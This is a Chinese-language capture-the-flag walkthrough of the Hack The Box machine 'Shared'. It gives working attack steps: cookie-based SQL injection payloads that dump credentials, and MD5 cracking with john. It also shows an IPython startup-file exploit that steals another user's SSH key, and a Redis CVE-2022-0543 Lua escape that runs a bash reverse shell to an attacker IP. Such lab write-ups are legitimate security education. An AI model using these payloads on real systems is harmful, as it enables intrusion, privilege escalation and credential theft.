![在这里插入图片描述](https://img-blog.csdnimg.cn/814644b811734b649c03c20966569131.png)
题目地址：
```
https://app.hackthebox.com/machines/Shared
```
# 枚举
使用nmap枚举靶机
```
nmap -sC -sV 10.10.11.172
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9454eefa3afd4d62b5877620adad464c.png)



机子只开启了22，80和443端口，同时我们还枚举到了域名，我们在本地dns解析一下这个域名

```
echo "10.10.11.172 shared.htb" >> /etc/hosts
```

然后枚举网站根目录
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,302 -u http://shared.htb/FUZZ
```
没有扫描到什么有用的目录

枚举网站子域名
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shared.htb
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9bb6b915bb904916add2e3e0688f9f4e.png)

发现了一个子域名，本地dns解析一下这个域名
```
echo "10.10.11.172 checkout.shared.htb" >> /etc/hosts
```
然后枚举网站的框架，我们去网页上面看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/f256965a020944469c54d379037c4574.png)

网站的框架是PrestaShop，通过google搜索此框架的相关漏洞，发现了一片文章
```
https://build.prestashop.com/news/major-security-vulnerability-on-prestashop-websites/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c93302ba55a94483ae6f350442b3e4ee.png)

在提交参数的时候，这个网站可能存在sql注入漏洞


![在这里插入图片描述](https://img-blog.csdnimg.cn/4180b789bf0b45c8b072775781f9e0f6.png)

这是一个购物网站，我随意选择了一个商品，点击付款

![在这里插入图片描述](https://img-blog.csdnimg.cn/838e3682b9d34adc8d7798164d4d2649.png)

他会跳转到我们之前扫描到的子域名网站上

![在这里插入图片描述](https://img-blog.csdnimg.cn/cd8323071fb34a4086566bb748f887ff.png)

用burp抓一下包，看看有没有什么突破点
# 获取用户shell
由于网站是https的，所以要在浏览器网络设置里添加一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/ea22b0ccd42940c4b3d81be4ac56c624.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/73f7f03bf8a04a1281ebdd5d17742d72.png)
在burp上可以看到，这里是商品的cookie，修改一下看看有没有sql注入漏洞
```
{"' and 0=1 union select 1,2,3-- -":"1"}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4a200ce2cf814ff8a48dab8bbaa140e2.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b823c7a134f4a0b9cf64a91277e9a3c.png)

说明网站存在sql注入漏洞，然后就是查表查字段了，找账号和密码

查询数据库名
```
{"' and 0=1 union select 1,database(),3-- -":"1"}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5250e86d43cb4a8ab7275c6fbd997f9e.png)


查表
```
{"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b58ed6185d98436f872b8f1876caa846.png)


查询用户名和密码
```
{"' and 0=1 union select 1,username,2 from checkout.user-- -":"1"}
{"' and 0=1 union select 1,password,2 from checkout.user-- -":"1"}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/3e218696d0d44ccb8ff268cedcdda0e6.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/e66c3fc678e24fa08de3191d4624b34c.png)

用john爆破这个密码的md5值
```
echo "fc895d4eddc2fc12f995e18c865cf273" > hash
john -w=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5   //设置格式为md5
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/542dfcd6f93947fa97bef6732be3e63a.png)
```
用户名：james_mason
密码：Soleil101
```
尝试登录ssh
```
ssh james_mason@10.10.11.172
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/42bc9f872abe4a65acaf0e3adeb7fdde.png)

登录成功，但是没有user.txt文件，而且还有第二个用户，看来我们要想办法登录另一个用户

查询developer组的suid权限文件
```
find / -group developer 2>/dev/null
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/11df90639aaa40e6b0db4bdaf2e91896.png)

找到一个文件，但是里面什么都没有

现在我们上传linpeas和pspy文件来搜集机子信息
```
https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0
https://github.com/carlospolop/PEASS-ng
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/858ded9e13ca4c59ae5bffa38bce4d1e.png)

开启apache服务，然后在靶机上下载文件

```
service apache2 start
wget http://10.10.14.8/pspy64
wget http://10.10.14.8/linpeas.sh
```
然后给这两个脚本执行的权限
```
chmod +x pspy64
chmod +x linpeas.sh
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/67c3f99e289b46b39502725dfc7027fd.png)

然后执行脚本，在运行pspy脚本监听linux进程时，发现了一个奇怪的程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/708cf53fa2af4413bcf5eeaa69a6e164.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/959dac78d6e043618a50a6ff479f018a.png)

dan_smith用户正在后台运行ipython程序，然后google看看ipython有没有相关的漏洞，然后发现了这篇文章
```
https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e6fe943571a64fbe8a31082142c272b5.png)

这个漏洞允许一个用户以另一个用户身份运行代码，我们可以执行cat命令，查看dan_smith用户的ssh密钥，之后ssh登录就好了

去到之前找到的的suid权限的目录，然后执行上面的命令
```
mkdir -m 777 profile_default
mkdir -m 777 profile_default/startup
echo "import os; os.system('cat ~/.ssh/id_rsa > /dev/shm/key')" > profile_default/startup/foo.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/53c21538f8b24b0490a4747d76d4fb8e.png)

成功得到dan_smith用户的密钥，在kali上创建一个名为id_rsa的文件，设置权限为600，将密钥复制进去

然后ssh登录
```
ssh -i id_rsa dan_smith@10.10.11.172
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5da6d9c1f278412b81f3b2f6f8eb5b26.png)

成功获得dan_smith用户的权限，在查看用户时，发现了一个奇怪的组
# 提权
查询这个组的suid权限的文件
```
find / -group sysadmin 2>/dev/null
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8ccb377df12e4c428a798128af425f4f.png)

找到一个有suid权限的程序，他是root用户创建的，但是我们可以执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/1197c9917bc74ddbada5717b0a8f003e.png)

它已通过redis身份验证，程序本身可能有密码，我们将这个程序下载到kali上分析
```
cd /usr/local/bin/
python3 -m http.server 5555
```
然后去kali上下载这个文件
```
wget http://10.10.11.172:5555/redis_connector_dev
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6a6a4f7634014eb89c821091fa811d91.png)

我们在本地运行一下这个程序试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/523ae87922384cac908d2034bbe25ca2.png)

它需要访问6379端口，我们用nc开一个试试
```
nc -nvlp 6379
```
运行程序，返回nc查看时，可以发现一个密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/1bd34df302f64889934c893bf54f9031.png)

然后通过google看能不能找到redis存在的漏洞，然后就发现了这篇文章
```
https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/cd2d3756acad4c9fb4791b6a1fae67e2.png)

cve-2022-0543，Redis中的关键Lua沙盒逃逸漏洞，可以造成RCE，我们用这个漏洞试试能不能提权

```
https://github.com/aodsec/CVE-2022-0543
```
可以用这个脚本，也可以手动提权

![在这里插入图片描述](https://img-blog.csdnimg.cn/94a70be9f81448778cd07e0f079ca7cc.png)

我们可以创建一个文件，里面是我们的反向shell，然后让程序执行这个文件，就能拿到root权限了

先去这个网站生成一个bash 的反向shell
```
https://www.revshells.com/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/002254c597314b26b22dcaa4f7a0a7df.png)
```
echo "/bin/bash -i >& /dev/tcp/10.10.14.8/3456 0>&1" > /home/dan_smith/shell
```
然后使用密码登录redis
```
redis-cli --pass F2WHqJUz2WEz=Gqq
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9cd541dcd92542a1a5d469173fda6506.png)


在kali上监听3456端口
```
nc -nvlp 3456
```

回到靶机，执行payload
```
eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /home/dan_smith/shell | bash"); local res = f:read("*a"); f:close(); return res' 0
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c7c192289ec64bf49358a54a8a51d6ea.png)

成功拿到root权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/c1ba2d73a4904843b224a7748c01347d.png)

